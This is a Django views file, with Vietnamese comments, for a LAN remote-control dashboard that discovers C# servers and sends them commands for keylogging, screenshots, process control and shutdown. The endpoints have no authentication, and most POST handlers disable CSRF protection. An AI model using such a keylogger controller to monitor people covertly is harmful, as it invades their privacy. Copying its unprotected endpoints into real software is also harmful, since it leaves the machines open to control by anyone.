"""
Remote Control Views - Django API Endpoints với Persistent Connection
Sử dụng Session-based connection management và UDP Discovery
"""
from django.shortcuts import render
from django.http import JsonResponse
from django.views.decorators.http import require_http_methods
from django.views.decorators.csrf import csrf_exempt
import json
import logging

# Import Persistent Client và UDP Discovery
from .socket_client_persistent import PersistentRemoteClient
from .udp_discovery import UDPDiscoveryClient

logger = logging.getLogger(__name__)


def _get_client(request):
    """
    Helper: Lấy PersistentRemoteClient từ session
    
    Hoạt động:
    1. Lấy session_id từ Django session (mỗi user có session_id unique)
    2. Lấy server IP đã lưu trong session (từ lúc connect)
    3. Gọi get_or_create() để lấy hoặc tạo persistent connection
    
    Returns:
        PersistentRemoteClient instance hoặc None nếu chưa connect
    """
    session_id = request.session.session_key
    if not session_id:
        # Chưa có session → Tạo session mới
        request.session.create()
        session_id = request.session.session_key
    
    # Lấy IP server đã lưu (được set khi user bấm Connect)
    server_ip = request.session.get('target_server_ip')
    
    if not server_ip:
        logger.warning("No target server IP in session")
        return None
    
    # Lấy hoặc tạo persistent client
    return PersistentRemoteClient.get_or_create(
        session_id=session_id,
        host=server_ip,
        port=5656,
        timeout=60
    )


def index(request):
    """Trang chủ Remote Control Dashboard - Tổng quan"""
    return render(request, 'remote_control/index.html')


# ==================== APPLICATION PAGES ====================

def applications_page(request):
    return render(request, 'remote_control/applications.html')


# ==================== PROCESS PAGES ====================

def processes_page(request):
    return render(request, 'remote_control/processes.html')


# ==================== OTHER FEATURE PAGES ====================

def screenshot_page(request):
    return render(request, 'remote_control/screenshot.html')


def keylogger_page(request):
    return render(request, 'remote_control/keylogger.html')


def webcam_page(request):
    return render(request, 'remote_control/webcam.html')


def power_page(request):
    return render(request, 'remote_control/power.html')


# ==================== UDP DISCOVERY API ====================

@require_http_methods(["GET"])
def discover_servers(request):
    """
    API: Tìm kiếm tất cả C# Servers trong LAN qua UDP broadcast
    
    Hoạt động:
    1. Tạo UDPDiscoveryClient
    2. Gửi broadcast "DISCOVER_SERVER" đến 255.255.255.255:9999
    3. Chờ responses trong 3 giây
    4. Parse và return danh sách servers
    
    Returns:
        JSON: {
            "success": True,
            "servers": [
                {"ip": "192.168.1.10", "name": "DESKTOP-ABC", "port": 5656},
                {"ip": "192.168.1.15", "name": "LAPTOP-XYZ", "port": 5656}
            ],
            "count": 2,
            "message": "Found 2 server(s)"
        }
    """
    try:
        # Tạo UDP Discovery Client
        discovery_client = UDPDiscoveryClient(timeout=3.0)
        
        # Discover servers (blocking 3 seconds)
        result = discovery_client.discover_with_details()
        
        return JsonResponse(result)
    
    except Exception as e:
        logger.error(f"Discovery error: {str(e)}")
        return JsonResponse({
            "success": False,
            "servers": [],
            "count": 0,
            "message": f"Discovery failed: {str(e)}"
        }, status=500)


# ==================== PERSISTENT CONNECTION APIs ====================

@csrf_exempt
@require_http_methods(["POST"])
def connect_server(request):
    """
    API: Tạo persistent connection đến C# Server
    
    Request body: {"server_ip": "192.168.1.10"}
    
    Hoạt động:
    1. Lưu server_ip vào Django session
    2. Tạo persistent socket connection qua PersistentRemoteClient
    3. Connection được lưu trong _instances dictionary theo session_id
    4. Trả về status cho frontend
    """
    try:
        data = json.loads(request.body)
        server_ip = data.get('server_ip')
        
        if not server_ip:
            return JsonResponse({
                "success": False,
                "message": "Server IP is required"
            }, status=400)
        
        # Lưu IP vào session
        request.session['target_server_ip'] = server_ip
        
        # Tạo hoặc lấy persistent client
        client = _get_client(request)
        
        if client and client.connected:
            return JsonResponse({
                "success": True,
                "message": f"Connected to {server_ip}",
                "server_ip": server_ip
            })
        else:
            return JsonResponse({
                "success": False,
                "message": "Failed to connect to server"
            }, status=500)
    
    except Exception as e:
        logger.error(f"Connect error: {str(e)}")
        return JsonResponse({
            "success": False,
            "message": str(e)
        }, status=500)


@csrf_exempt
@require_http_methods(["POST"])
def disconnect_server(request):
    """
    API: Ngắt persistent connection
    
    Hoạt động:
    1. Lấy session_id
    2. Gọi PersistentRemoteClient.disconnect_session()
    3. Xóa thông tin khỏi Django session
    4. Cleanup resources
    """
    try:
        session_id = request.session.session_key
        
        if session_id:
            # Disconnect và remove khỏi pool
            PersistentRemoteClient.disconnect_session(session_id)
        
        # Xóa thông tin khỏi session
        if 'target_server_ip' in request.session:
            del request.session['target_server_ip']
        
        return JsonResponse({
            "success": True,
            "message": "Disconnected from server"
        })
    
    except Exception as e:
        logger.error(f"Disconnect error: {str(e)}")
        return JsonResponse({
            "success": False,
            "message": str(e)
        }, status=500)


# ==================== EXISTING APIs (Updated to use Persistent Client) ====================

@require_http_methods(["GET"])
def get_keylog_status(request):
    """API: Lấy trạng thái keylogger - DÙNG PERSISTENT CONNECTION"""
    client = _get_client(request)
    if not client:
        return JsonResponse({"status": "error", "message": "Not connected to server"}, status=400)
    
    result = client.send_command("KEYLOG", "STATUS")
    return JsonResponse(result)


@require_http_methods(["GET"])
def get_processes(request):
    """API: Lấy danh sách processes - DÙNG PERSISTENT CONNECTION"""
    client = _get_client(request)
    if not client:
        return JsonResponse({"status": "error", "message": "Not connected to server"}, status=400)
    
    result = client.send_command("PROCESS", "XEM")
    return JsonResponse(result)


@csrf_exempt
@require_http_methods(["POST"])
def kill_process(request):
    """API: Diệt process theo ID - DÙNG PERSISTENT CONNECTION"""
    client = _get_client(request)
    if not client:
        return JsonResponse({"status": "error", "message": "Not connected to server"}, status=400)
    
    try:
        data = json.loads(request.body)
        process_id = data.get('id')
        result = client.send_command("PROCESS", "KILL", process_id)
        return JsonResponse(result)
    except Exception as e:
        return JsonResponse({"status": "error", "message": str(e)})


@csrf_exempt
@require_http_methods(["POST"])
def start_process(request):
    """API: Khởi động process/application - DÙNG PERSISTENT CONNECTION"""
    client = _get_client(request)
    if not client:
        return JsonResponse({"status": "error", "message": "Not connected to server"}, status=400)
    
    try:
        data = json.loads(request.body)
        process_name = data.get('name')
        result = client.send_command("PROCESS", "START", process_name)
        return JsonResponse(result)
    except Exception as e:
        return JsonResponse({"status": "error", "message": str(e)})


@require_http_methods(["GET"])
def get_apps(request):
    """API: Lấy danh sách applications - DÙNG PERSISTENT CONNECTION"""
    client = _get_client(request)
    if not client:
        return JsonResponse({"status": "error", "message": "Not connected to server"}, status=400)
    
    result = client.send_command("APPLICATION", "XEM")
    return JsonResponse(result)


@csrf_exempt
@require_http_methods(["POST"])
def kill_app(request):
    """API: Diệt application theo ID - DÙNG PERSISTENT CONNECTION"""
    client = _get_client(request)
    if not client:
        return JsonResponse({"status": "error", "message": "Not connected to server"}, status=400)
    
    try:
        data = json.loads(request.body)
        app_id = data.get('id')
        result = client.send_command("APPLICATION", "KILL", app_id)
        return JsonResponse(result)
    except Exception as e:
        return JsonResponse({"status": "error", "message": str(e)})


@require_http_methods(["GET"])
def take_screenshot(request):
    """API: Chụp màn hình - DÙNG PERSISTENT CONNECTION"""
    client = _get_client(request)
    if not client:
        return JsonResponse({"status": "error", "message": "Not connected to server"}, status=400)
    
    result = client.send_command("TAKEPIC")
    return JsonResponse(result)


@require_http_methods(["GET"])
def get_keylog(request):
    """API: Lấy dữ liệu keylog - DÙNG PERSISTENT CONNECTION"""
    client = _get_client(request)
    if not client:
        return JsonResponse({"status": "error", "message": "Not connected to server"}, status=400)
    
    result = client.send_command("KEYLOG", "PRINT")
    return JsonResponse(result)


@csrf_exempt
@require_http_methods(["POST"])
def hook_keylog(request):
    """API: Bật/tắt keylogger - DÙNG PERSISTENT CONNECTION"""
    client = _get_client(request)
    if not client:
        return JsonResponse({"status": "error", "message": "Not connected to server"}, status=400)
    
    try:
        data = json.loads(request.body)
        action = data.get('action')  # HOOK hoặc UNHOOK
        result = client.send_command("KEYLOG", action)
        return JsonResponse(result)
    except Exception as e:
        return JsonResponse({"status": "error", "message": str(e)})


@csrf_exempt
@require_http_methods(["POST"])
def clear_keylog(request):
    """API: Xóa dữ liệu keylog - DÙNG PERSISTENT CONNECTION"""
    client = _get_client(request)
    if not client:
        return JsonResponse({"status": "error", "message": "Not connected to server"}, status=400)
    
    result = client.send_command("KEYLOG", "CLEAR")
    return JsonResponse(result)


@csrf_exempt
@require_http_methods(["POST"])
def power_action(request):
    """API: Shutdown/Restart remote server - DÙNG PERSISTENT CONNECTION"""
    client = _get_client(request)
    if not client:
        return JsonResponse({"status": "error", "message": "Not connected to server"}, status=400)
    
    try:
        data = json.loads(request.body)
        action = data.get('action')  # SHUTDOWN hoặc RESTART
        result = client.send_command(action)
        return JsonResponse(result)
    except Exception as e:
        return JsonResponse({"status": "error", "message": str(e)})
